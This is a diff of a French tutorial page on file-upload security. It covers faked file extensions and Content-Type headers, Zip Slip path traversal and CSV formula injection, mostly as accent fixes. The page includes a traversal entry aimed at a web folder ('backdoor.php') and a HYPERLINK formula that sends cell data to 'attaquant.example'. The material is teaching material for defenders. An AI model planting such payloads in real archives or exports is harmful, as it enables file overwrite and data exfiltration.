@@ -11,12 +11,12 @@ Accepter un fichier envoyé par l'utilisateur (photo de profil, justificatif, im
 Le nom de fichier et l'en-tête `Content-Type` envoyés par le navigateur lors d'un upload sont des informations fournies par le CLIENT, donc falsifiables comme n'importe quelle autre donnée d'une requête (voir le principe déjà posé dans [Les grandes familles de failles](/?c=securite&s=cybersecurite&p=types-de-failles) : ne jamais faire confiance à une donnée externe sans la valider).
 
 ```text
-Fichier reellement envoye : script.php renomme en photo.jpg
-En-tete Content-Type envoye par le navigateur : image/jpeg   (facilement falsifiable)
+Fichier réellement envoyé : script.php renommé en photo.jpg
+En-tête Content-Type envoyé par le navigateur : image/jpeg   (facilement falsifiable)
 Extension du nom de fichier : .jpg                            (juste un nom, pas un contenu)
 
--> Si le serveur ne verifie QUE l'extension/le Content-Type declare,
-   un fichier executable peut se faire passer pour une image
+-> Si le serveur ne vérifie QUE l'extension/le Content-Type déclaré,
+   un fichier exécutable peut se faire passer pour une image
 ```
 
 | Vérification | Fiabilité | Ce qu'elle empêche |
@@ -47,13 +47,13 @@ Un document Office (`.docx`, `.xlsx`) est en réalité une ARCHIVE zip contenant
 Une archive (`.zip`, `.tar`) que l'application extrait automatiquement (import en masse, décompression d'un thème, dépôt de fichiers groupés) contient une liste de chemins de fichiers internes, définis par qui a créé l'archive. Un chemin conçu pour remonter hors du dossier de destination prévu peut écrire n'importe où ailleurs sur le disque, si l'extraction ne le vérifie pas.
 
 ```text
-Contenu attendu d'une entree d'archive :  images/photo.jpg
-  -> extrait vers : /var/www/uploads/images/photo.jpg   (dans le dossier prevu)
+Contenu attendu d'une entrée d'archive :  images/photo.jpg
+  -> extrait vers : /var/www/uploads/images/photo.jpg   (dans le dossier prévu)
 
-Entree piegee :  ../../../../var/www/html/backdoor.php
-  -> si l'outil d'extraction suit ce chemin tel quel, le fichier est ecrit
-     HORS du dossier de destination prevu, potentiellement dans un dossier
-     EXECUTABLE par le serveur web
+Entrée piégée :  ../../../../var/www/html/backdoor.php
+  -> si l'outil d'extraction suit ce chemin tel quel, le fichier est écrit
+     HORS du dossier de destination prévu, potentiellement dans un dossier
+     EXÉCUTABLE par le serveur web
 ```
 
 Le nom vient de l'idée d'un fichier qui "glisse" (*slip*) hors du dossier cible pendant l'extraction, exactement le même principe que la [traversée de chemin](/?c=securite&s=cybersecurite&p=types-de-failles) appliquée cette fois à chaque entrée d'une archive plutôt qu'à un seul nom de fichier fourni directement.
@@ -67,13 +67,15 @@ Le nom vient de l'idée d'un fichier qui "glisse" (*slip*) hors du dossier cible
 Un fichier `.csv` généré par l'application (export de données, rapport) et destiné à être ouvert dans un tableur (Excel, Google Sheets) porte un risque propre à ce format de destination : le tableur interprète toute cellule commençant par `=`, `+`, `-` ou `@` comme une FORMULE à calculer, pas comme du texte brut.
 
 ```text
-Donnée utilisateur stockée telle quelle : =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
+Donnée utilisateur stockée telle quelle :
+  =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
 
-Export CSV du champ :  =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
+Export CSV du champ :
+  =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
 
-A l'ouverture du CSV dans Excel : la cellule affiche un lien cliquable "Cliquez ici",
-qui envoie en realite le contenu d'une autre cellule (A1) vers un serveur attaquant
-des qu'il est clique -- ou pire, certaines formules s'executent SANS meme etre cliquees
+À l'ouverture du CSV dans Excel : la cellule affiche un lien cliquable "Cliquez ici",
+qui envoie en réalité le contenu d'une autre cellule (A1) vers un serveur attaquant
+dès qu'il est cliqué ; pire, certaines formules s'exécutent SANS même être cliquées
 ```
 
 Ce risque touche n'importe quelle donnée utilisateur exportée telle quelle (pseudo, commentaire, nom de fichier) : rien dans le format CSV lui-même n'échappe ces caractères, c'est uniquement le tableur qui les interprète ainsi à l'ouverture.
